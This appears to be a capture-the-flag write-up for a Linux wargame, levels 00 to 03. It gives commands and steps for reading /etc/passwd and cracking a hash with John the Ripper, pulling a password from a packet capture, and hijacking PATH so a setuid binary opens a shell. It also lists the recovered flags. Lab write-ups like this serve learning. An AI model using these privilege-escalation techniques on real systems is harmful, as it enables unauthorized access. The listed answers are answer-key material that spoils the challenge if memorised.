# CyberBranch

### SSH Connection
```ssh levelXX@localhost -p 4243```

### Login steps
```
su flagXX

getflag

su levelXX
```

## Level 00
- Find files owned by flag00
```find / -group flag00 2>/dev/null```

- Cat messages
=> *cdiiddwpgswtgt*

- Decrypt with [Ceasar Cypher](https://www.dcode.fr/chiffre-cesar)
=> *nottoohardhere*

## Level 01
- Search in sensitive files
```cat /etc/passwd```
=> flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash

- John the ripper + rockyou.txt
=> 'abcdefg'

## Level 02
- file available
```level02.pcap```

- Wireshark (follow tcp stream)
```
..%..%..&..... ..#..'..$..&..... ..#..'..$.. .....#.....'........... .38400,38400....#.SodaCan:0....'..DISPLAY.SodaCan:0......xterm.........."........!........"..".....b........b....	B.
..............................1.......!.."......"......!..........."........"..".............	..
.....................
Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)

..wwwbugs login: l.le.ev.ve.el.lX.X
..
Password: ft_wandr...NDRel.L0L
.
..
Login incorrect
wwwbugs login:
```

- Remove backspaces ('.')
```ft_waNDReL0L```

## Level 03
- Check available binary authorization
```-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03```
=> The program is run as flag 3

- Reverse available binary
=> The system call is run as flag03

- Change echo call to run a bash
```
=> Create a echo file that run a shell (/bin/bash)
=> Change Path so that echo runs the fake echo export PATH=/tmp/:$PATH
=> Run the program (so it open a bash instead of running echo)
```